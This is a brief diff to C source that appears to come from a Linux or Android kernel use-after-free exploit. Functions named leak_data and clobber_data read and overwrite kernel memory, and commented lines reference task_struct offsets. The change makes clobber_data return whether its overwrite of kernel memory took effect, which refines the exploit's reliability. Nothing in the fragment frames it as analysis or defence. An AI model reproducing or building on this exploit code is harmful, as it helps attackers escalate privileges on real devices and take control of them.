@@ -158,7 +158,7 @@ void leak_data(void* leakBuffer, int leakAmount)
   printf("PARENT: Done with leaking\n");
 }
 
-void clobber_data(unsigned long payloadAddress, const void *src, unsigned long payloadLength)
+int clobber_data(unsigned long payloadAddress, const void *src, unsigned long payloadLength)
 {
   int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
   char* dummyBuffer = malloc(dummyBufferSize);
@@ -261,6 +261,8 @@ void clobber_data(unsigned long payloadAddress, const void *src, unsigned long p
 //  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
 //  printf("current->mm == 0x%lx\n", current_mm);
    free(dummyBuffer);
+   
+   return testDatum != testValue;
 }
 
 int kernel_rw_pipe[2];
